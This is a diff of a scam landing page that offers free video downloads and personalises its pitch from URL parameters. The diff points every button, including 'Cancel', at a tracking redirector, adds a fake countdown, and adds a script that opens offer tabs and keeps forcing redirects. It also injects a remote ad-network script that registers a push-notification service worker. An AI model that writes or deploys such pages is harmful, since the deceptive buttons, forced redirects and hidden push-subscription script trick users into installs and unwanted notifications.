@@ -763,12 +763,16 @@
                 result = 'Phone'
             }
 
-            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
+            if(name.indexOf('model') !== -1 && contains(result, 'android')) {
                 result = 'Phone'
             }
 
             if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
                 result = 'Internet Browser'
+            }
+
+            if(result==null||result==""){
+                result = 'Phone'
             }
 
             return result;
@@ -884,19 +888,19 @@ setTimeout(func, getRandomInt(120,220)*1000);
         <div class="text">
 
 
-            <h1 class="blink_me">Watch and download any video without restrictions in <span style="background-color: #ffa31a; color: #1b1b1b"><script>document.write(getURLParameter("country"))</script>Singapore</span>!</h1>
-            <p>Congratulations! One-time unique opportunity for <script>document.write(getURLParameter("browser_name"))</script>Chrome Mobile users.</p>
+            <h1 class="blink_me">Watch and download any video without restrictions in <span style="background-color: #ffa31a; color: #1b1b1b"><script>document.write(getURLParameter("country"))</script></span>!</h1>
+            <p>Congratulations! One-time unique opportunity for <script>document.write(getURLParameter("browser_name"))</script> users.</p>
             <br>
-            <a href="https://krmnk.com/click.php?lp=1"><img src="logo.png" style="width:200px;height:200px;display: block;margin-left: auto;margin-right: auto;"></a>
+            <a onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2"><img  onclick="ctaclick()" src="./logo.png" style="width:200px;height:200px;display: block;margin-left: auto;margin-right: auto;"></a>
             <br>
             <p style="text-align: center;">Are you still looking for a way to save your favorite videos to your phone?<br> You are one of lucky users. Hurry up download for free!</p>
             <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:#ffa31a;font-family:sans-serif;" id="theTime">5 minutes 29 seconds</span></p>
         </div>
         <div class="buttons">
-            <a class="button exitpoint" href="https://krmnk.com/click.php?lp=1">
+            <a class="button exitpoint"  onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">
 				<span>Install</span>
             </a>
-            <a class="button cancel" href="https://krmnk.com/click.php?lp=1">
+            <a class="button cancel"  onclick="ctaclick()" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">
 				<span>Cancel</span>
             </a>
         </div>
@@ -904,13 +908,35 @@ setTimeout(func, getRandomInt(120,220)*1000);
 	<form style="visibility:collapse;"><textarea name="comment"></textarea></form>
 </div>
 
-
+<script>
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
+    }
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+    }
+    
+</script>
 
 <script>
-
-    function goto() {
-      //  window[obu] = null;
-        location.href = "https://krmnk.com/click.php?lp=1"
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
     }
+    document.head.appendChild(s);
 </script>
+
 </body></html>
